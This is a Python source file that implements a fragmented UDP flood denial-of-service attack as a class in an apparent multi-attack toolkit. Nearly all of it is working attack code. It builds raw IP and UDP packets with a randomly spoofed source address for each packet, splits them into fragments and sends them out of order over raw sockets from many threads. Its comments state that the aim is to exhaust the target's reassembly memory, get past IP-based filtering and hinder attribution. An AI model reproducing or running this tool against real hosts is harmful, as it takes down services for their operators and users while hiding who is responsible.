import os
import sys
import socket
import struct
import random
import time
import threading

# Add the current directory to sys.path to handle imports from different execution contexts
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from attack_strategy import AttackStrategy
except ImportError:
    # If direct import fails, try relative import
    from .attack_strategy import AttackStrategy

"""
UDP Fragmented Flood Attack Implementation

This attack exploits IP fragmentation by sending large UDP packets that are fragmented
at the IP layer, causing the target to consume resources reassembling fragments.
Uses IP SPOOFING to make packets appear from random source addresses.

PACKET STRUCTURE DETAILS:
========================

1. IP HEADER (20 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Source Address (SPOOFED)                   |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   IP Header Fields:
   - Version: 4 (IPv4)
   - IHL: 5 (Internet Header Length = 20 bytes)
   - Type of Service: 0 (Normal precedence, normal delay)
   - Total Length: Size of IP header + fragment payload
   - Identification: Random 16-bit value for fragment grouping
   - Flags: 3 bits (Reserved=0, DF=0, MF=0/1)
     * Don't Fragment (DF): 0 (allow fragmentation)
     * More Fragments (MF): 1 (more fragments follow) or 0 (last fragment)
   - Fragment Offset: 13 bits, position in original packet (8-byte units)
   - TTL: 64 (Time To Live)
   - Protocol: 17 (UDP)
   - Header Checksum: Calculated by kernel (0x0000 in raw socket)
   - Source Address: SPOOFED random IP address (xxx.xxx.xxx.xxx)
   - Destination Address: Target IP address

2. UDP HEADER (8 bytes) - ONLY IN FIRST FRAGMENT:
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |            Length             |           Checksum            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   UDP Header Fields:
   - Source Port: Random port (1024-65535)
   - Destination Port: Target port
   - Length: UDP header (8) + TOTAL original payload length
   - Checksum: Calculated using pseudo-header

3. PSEUDO HEADER (for UDP checksum calculation):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                         Source Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |      Zero     |    Protocol   |          UDP Length           |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

FRAGMENTATION STRATEGY:
======================
- Original UDP packet size: 1500-8000 bytes
- MTU: 1500 bytes (Ethernet standard)
- Fragment payload size: 1480 bytes (1500 - 20 IP header)
- Multiple fragments per original packet
- Each fragment has same IP identification number
- Last fragment has More Fragments (MF) flag = 0
- Fragments sent OUT OF ORDER to maximize processing overhead

MODIFIED ATTACK PACKET STRUCTURE:
=================================

A. FIRST FRAGMENT (contains UDP header):
   +--------------------+
   |    IP Header       | 20 bytes
   | (MF=1, Offset=0)   |
   +--------------------+
   |    UDP Header      | 8 bytes
   +--------------------+
   |    Payload Data    | 1472 bytes (1480-8)
   +--------------------+
   Total: 1500 bytes

B. MIDDLE FRAGMENTS (data only):
   +--------------------+
   |    IP Header       | 20 bytes
   | (MF=1, Offset=N)   |
   +--------------------+
   |    Payload Data    | 1480 bytes
   +--------------------+
   Total: 1500 bytes

C. LAST FRAGMENT (data only):
   +--------------------+
   |    IP Header       | 20 bytes
   | (MF=0, Offset=N)   |
   +--------------------+
   |    Payload Data    | Variable (remaining bytes)
   +--------------------+
   Total: 20 + remaining bytes

ATTACK MECHANICS WITH IP SPOOFING:
=================================
- Generates RANDOM SPOOFED source IP for each packet
- Sends fragmented UDP packets to exhaust reassembly buffers
- Uses IP spoofing to avoid detection and source-based filtering
- Fragments are sent out of order to maximize processing overhead
- Target must allocate memory for partial packet reassembly
- Incomplete fragments consume resources until timeout
- Multiple spoofed sources make the attack appear distributed

IP SPOOFING IMPLEMENTATION:
==========================
- Each worker thread generates random source IP (xxx.xxx.xxx.xxx)
- Source IP range: 1.1.1.1 to 254.254.254.254
- Random source port: 1024-65535
- Makes traffic appear to come from different hosts
- Bypasses simple IP-based filtering/blocking
- Complicates attack attribution and response
- Uses IP spoofing to avoid detection and filtering
- Fragments are sent out of order to maximize processing overhead
- Target must allocate memory for partial packet reassembly
- Incomplete fragments consume resources until timeout
"""


class FragmentedUDPFlood(AttackStrategy):
    """
    Concrete implementation of the AttackStrategy for Fragmented UDP Flood attacks.

    This attack sends large UDP packets that are fragmented at the IP layer,
    forcing the target to consume resources reassembling fragments.

    KEY FEATURES:
    - Uses IP SPOOFING to generate random source IP addresses
    - Sends fragments out of order to maximize processing overhead
    - Exploits fragment reassembly buffers to cause resource exhaustion
    - Bypasses simple IP-based filtering through source address randomization

    ATTACK MECHANISM:
    1. Generate random spoofed source IP address
    2. Create large UDP packet (1500-8000 bytes)
    3. Fragment packet into multiple IP fragments
    4. Send fragments out of order with spoofed source
    5. Target must allocate resources to reassemble fragments
    6. Incomplete/delayed fragments waste memory until timeout
    """

    def __init__(self, target_ip, target_port, duration=60, threads=20):
        """
        Initialize the Fragmented UDP Flood attack.

        Args:
            target_ip (str): The IP address of the target server
            target_port (int): The port number to attack
            duration (int): Duration of the attack in seconds (default: 60)
            threads (int): Number of threads to use for the attack (default: 20)
        """
        super().__init__(target_ip, target_port, duration, threads)
        self.fragment_size = 1480  # Maximum fragment payload size (1500 - 20 IP header)
        self.max_packet_size = 8000  # Maximum original UDP packet size
        self.min_packet_size = 1500  # Minimum packet size to ensure fragmentation

    def _create_ip_header(
        self, source_ip, dest_ip, total_length, identification, flags, fragment_offset
    ):
        """
        Create an IP header for the fragmented packet.

        Args:
            source_ip (str): Source IP address (spoofed)
            dest_ip (str): Destination IP address
            total_length (int): Total length of IP packet
            identification (int): Fragment identification number
            flags (int): IP flags (Don't Fragment, More Fragments)
            fragment_offset (int): Fragment offset in 8-byte units

        Returns:
            bytes: Packed IP header
        """
        version = 4
        ihl = 5  # Header length in 32-bit words
        tos = 0  # Type of service
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0  # Checksum will be calculated by kernel
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(dest_ip)

        # Pack IP header
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,  # Version and IHL
            tos,  # Type of Service
            total_length,  # Total Length
            identification,  # Identification
            flags | fragment_offset,  # Flags and Fragment Offset
            ttl,  # TTL
            protocol,  # Protocol
            check,  # Checksum
            saddr,  # Source Address
            daddr,
        )  # Destination Address

        return ip_header

    def _create_udp_header(self, source_port, dest_port, udp_length):
        """
        Create a UDP header.

        Args:
            source_port (int): Source port number
            dest_port (int): Destination port number
            udp_length (int): UDP packet length (header + data)

        Returns:
            bytes: Packed UDP header
        """
        checksum = 0  # Will be calculated later

        udp_header = struct.pack(
            "!HHHH",
            source_port,  # Source Port
            dest_port,  # Destination Port
            udp_length,  # Length
            checksum,
        )  # Checksum

        return udp_header

    def _calculate_udp_checksum(self, source_ip, dest_ip, udp_header, udp_data):
        """
        Calculate UDP checksum using pseudo-header.

        Args:
            source_ip (str): Source IP address
            dest_ip (str): Destination IP address
            udp_header (bytes): UDP header
            udp_data (bytes): UDP payload data

        Returns:
            int: Calculated checksum
        """
        # Create pseudo-header
        pseudo_header = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(source_ip),  # Source Address
            socket.inet_aton(dest_ip),  # Destination Address
            0,  # Zero
            socket.IPPROTO_UDP,  # Protocol
            len(udp_header) + len(udp_data),
        )  # UDP Length

        # Combine pseudo-header, UDP header, and data
        checksum_data = pseudo_header + udp_header + udp_data

        return self.checksum(checksum_data)

    def _create_fragment(
        self,
        source_ip,
        dest_ip,
        source_port,
        dest_port,
        identification,
        fragment_data,
        fragment_offset,
        more_fragments,
    ):
        """
        Create a single IP fragment containing UDP data.

        Args:
            source_ip (str): Source IP address
            dest_ip (str): Destination IP address
            source_port (int): Source port number
            dest_port (int): Destination port number
            identification (int): Fragment identification
            fragment_data (bytes): Fragment payload data
            fragment_offset (int): Fragment offset in bytes
            more_fragments (bool): Whether more fragments follow

        Returns:
            bytes: Complete IP fragment packet
        """
        # Calculate fragment offset in 8-byte units
        offset_units = fragment_offset // 8

        # Set flags
        flags = 0x0000  # Don't Fragment = 0
        if more_fragments:
            flags |= 0x2000  # More Fragments = 1

        # For first fragment, include UDP header
        if fragment_offset == 0:
            # Create UDP header (only in first fragment)
            udp_length = 8 + len(fragment_data)  # This is just for the fragment
            udp_header = self._create_udp_header(source_port, dest_port, udp_length)

            # Calculate UDP checksum (simplified for fragmented packets)
            udp_checksum = self._calculate_udp_checksum(
                source_ip, dest_ip, udp_header, fragment_data
            )

            # Update UDP header with correct checksum
            udp_header = struct.pack(
                "!HHHH", source_port, dest_port, udp_length, udp_checksum
            )

            fragment_payload = udp_header + fragment_data
        else:
            # Subsequent fragments contain only data
            fragment_payload = fragment_data

        # Calculate total length
        total_length = 20 + len(fragment_payload)  # IP header + payload

        # Create IP header
        ip_header = self._create_ip_header(
            source_ip, dest_ip, total_length, identification, flags, offset_units
        )

        # Combine IP header and payload
        packet = ip_header + fragment_payload

        return packet

    def _create_fragmented_udp_packet(self, source_ip, dest_ip, source_port, dest_port):
        """
        Create a large UDP packet and fragment it.

        Args:
            source_ip (str): Source IP address
            dest_ip (str): Destination IP address
            source_port (int): Source port number
            dest_port (int): Destination port number

        Returns:
            list: List of fragment packets
        """
        # Generate random payload size
        payload_size = random.randint(self.min_packet_size, self.max_packet_size)

        # Create random payload data
        payload_data = bytes([random.randint(0, 255) for _ in range(payload_size)])

        # Generate unique identification for this packet
        identification = random.randint(1, 65535)

        fragments = []
        fragment_offset = 0

        # First fragment includes UDP header space
        first_fragment_data_size = self.fragment_size - 8  # Account for UDP header
        first_fragment_data = payload_data[:first_fragment_data_size]

        # Create first fragment
        more_fragments = len(payload_data) > first_fragment_data_size
        first_fragment = self._create_fragment(
            source_ip,
            dest_ip,
            source_port,
            dest_port,
            identification,
            first_fragment_data,
            fragment_offset,
            more_fragments,
        )
        fragments.append(first_fragment)

        # Update offset and remaining data
        fragment_offset += 8 + len(first_fragment_data)  # UDP header + data
        remaining_data = payload_data[first_fragment_data_size:]

        # Create subsequent fragments
        while remaining_data:
            fragment_data = remaining_data[: self.fragment_size]
            remaining_data = remaining_data[self.fragment_size :]

            more_fragments = len(remaining_data) > 0

            fragment = self._create_fragment(
                source_ip,
                dest_ip,
                source_port,
                dest_port,
                identification,
                fragment_data,
                fragment_offset,
                more_fragments,
            )
            fragments.append(fragment)

            fragment_offset += len(fragment_data)

        self.logger.debug(
            f"Created {len(fragments)} fragments for packet ID {identification}"
        )
        return fragments

    def _send_fragments(self, fragments, dest_ip):
        """
        Send fragments to the target, potentially out of order.

        Args:
            fragments (list): List of fragment packets
            dest_ip (str): Destination IP address

        Returns:
            int: Number of fragments successfully sent
        """
        sent_count = 0

        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Shuffle fragments to send out of order (increases processing overhead)
            fragment_order = list(range(len(fragments)))
            random.shuffle(fragment_order)

            for i in fragment_order:
                try:
                    sock.sendto(fragments[i], (dest_ip, 0))
                    sent_count += 1

                    # Small delay between fragments
                    time.sleep(0.001)

                except Exception as e:
                    self.logger.error(f"Error sending fragment {i}: {e}")
                    continue

            sock.close()

        except Exception as e:
            error_msg = f"Error creating socket for fragments: {e}"
            self.logger.error(error_msg)
            self._print_error(error_msg)
            return 0

        return sent_count

    def _check_privileges(self):
        """Check if running with appropriate privileges for UDP raw sockets."""
        return self._check_raw_socket_privileges(socket.IPPROTO_UDP)

    def _start_worker_threads(self):
        """Start worker threads for the fragmented UDP flood attack."""
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._udp_fragment_worker, name=f"UDPFragFlood-{i}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        return threads

    def _udp_fragment_worker(self):
        """Worker thread for sending fragmented UDP packets with IP spoofing."""
        thread_id = threading.current_thread().ident
        self.logger.debug(f"UDP Fragment worker thread {thread_id} started")

        while self.attack_active:
            try:
                # IP SPOOFING: Generate random spoofed source IP address
                # This makes packets appear to come from different hosts
                source_ip = self.generate_random_ip()
                source_port = random.randint(1024, 65535)

                self.logger.debug(
                    f"Thread {thread_id}: Spoofing source IP {source_ip}:{source_port}"
                )

                # Create fragmented UDP packet with spoofed source
                fragments = self._create_fragmented_udp_packet(
                    source_ip, self.target_ip, source_port, self.target_port
                )

                # Send fragments out of order to maximize processing overhead
                sent_count = self._send_fragments(fragments, self.target_ip)

                if sent_count > 0:
                    self.packets_sent += sent_count
                    self.logger.debug(
                        f"Sent {sent_count} fragments from spoofed {source_ip}:{source_port}"
                    )

                # Delay between packet generations
                time.sleep(0.05)

            except Exception as e:
                error_msg = f"Error in UDP fragment worker thread {thread_id}: {e}"
                self.logger.error(error_msg)
                continue

        self.logger.debug(f"UDP Fragment worker thread {thread_id} stopped")

    def _monitor_attack_progress(self, start_time):
        """Monitor and display fragmented UDP attack progress."""
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0

                # Get color-coded rate display
                rate_color = self._get_rate_color(rate)

                progress_msg = f"Elapsed: {elapsed:.1f}s | Fragments: {self.packets_sent} | Rate: {rate:.1f} fps"
                self._print_colored(f"\r{progress_msg}", rate_color, end="")

                # Log progress every 10 seconds
                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                    self.logger.info(f"UDP Fragment attack progress - {progress_msg}")

                time.sleep(1)
        except KeyboardInterrupt:
            self._print_warning("\nUDP Fragment attack interrupted by user")
            self.logger.warning("UDP Fragment attack interrupted by user")

    def attack(self):
        """
        Execute the Fragmented UDP Flood attack with IP spoofing.
        """
        # Display attack header
        self._display_attack_header()

        self.logger.info(
            f"Starting Fragmented UDP Flood attack on {self.target_ip}:{self.target_port}"
        )
        self.logger.info(
            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
        )
        self.logger.info(
            f"Fragment configuration - Max size: {self.fragment_size} bytes, Packet size: {self.min_packet_size}-{self.max_packet_size} bytes"
        )
        self.logger.info(
            "IP SPOOFING ENABLED: Using random source IP addresses for each packet"
        )

        # Check privileges
        if not self._check_privileges():
            return

        # Start the attack
        self.attack_active = True
        start_time = time.time()

        self._print_header("Starting UDP fragment attack threads...")
        self._print_info("🎭 IP Spoofing: Each packet uses a random source IP address")
        self._print_info(
            "🧩 Fragmentation: Large packets split into multiple fragments"
        )
        self._print_info(
            "🔀 Out-of-order: Fragments sent randomly to maximize processing overhead"
        )

        self.logger.info(
            f"Starting {self.threads} UDP fragment worker threads with IP spoofing"
        )

        # Create and start worker threads
        threads = self._start_worker_threads()

        self._print_success(f"✓ {self.threads} UDP fragment worker threads started")
        self._print_info("Fragmented UDP attack in progress... Press Ctrl+C to stop")

        # Monitor attack progress
        self._monitor_attack_progress(start_time)

        # Stop the attack
        self.attack_active = False
        self._print_info("\nStopping UDP fragment attack threads...")

        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=1)

        # Display final results
        self._display_attack_completion(start_time)


# Example usage for testing
if __name__ == "__main__":
    # Setup basic logging for standalone usage
    import logging

    logging.basicConfig(
        level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
    )

    target_ip = "127.0.0.1"  # Localhost for testing
    target_port = 53  # DNS port

    # Create attack instance with reduced parameters for testing
    attack = FragmentedUDPFlood(target_ip, target_port, duration=5, threads=3)

    # Execute the attack
    attack.attack()
